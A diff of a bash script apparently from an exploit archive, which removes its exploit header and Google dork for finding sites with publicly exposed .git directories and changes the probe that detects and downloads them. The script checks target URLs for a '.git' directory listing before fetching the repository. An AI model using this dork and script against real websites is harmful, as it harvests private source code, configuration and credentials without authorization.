@@ -1,19 +1,3 @@
-# Exploit Title: Restore GIT repository by publicly exposed .git directory
-# Google Dork: intitle:"Index of /.git"
-# Date: 2022-10-01
-# Exploit Author: Adrian Grabowski
-# Vendor Homepage: N/A
-# Software Link: N/A
-# Category: Web Application
-# Tested on: Apache2
-# CVE : N/A
-
-# Explanation: Most of the web-applications are maintained using git
-# repositories containing important data like
-# db-info,logs,configs,main-source code,etc. Many of them are forget to hide
-# or remove the .git directory from live websites.Its can able to expose of
-# important data.
-
 #/bin/bash
 
 GREEN='\033[0;32m'
@@ -22,7 +6,7 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 
 header() {
-  echo "GitDownloader - download and restore repository by exposed .git directory"
+  echo "ExposedGitDownloader - download and restore repository by exposed .git directory"
   echo ""
 }
 
@@ -31,10 +15,9 @@ process_website() {
 
   printf "${YELLOW}[!] ${NC} Checking ${url}... \n"
 
-  # TODO: Zmienić na wget
-  result=$(curl $url/.git -L -s --connect-timeout 3  | grep "Index of")
+  isGitDirectoryExposed=$(wget $url/.git -q -O - | grep "Index of")
 
-  if [[ ! -z "$result" ]] ; then
+  if [[ ! -z "$isGitDirectoryExposed" ]] ; then
       printf "${GREEN}[+] ${NC} SUCCESS: git exposed\n"
       printf "[ ]  Downloading...\n"
 
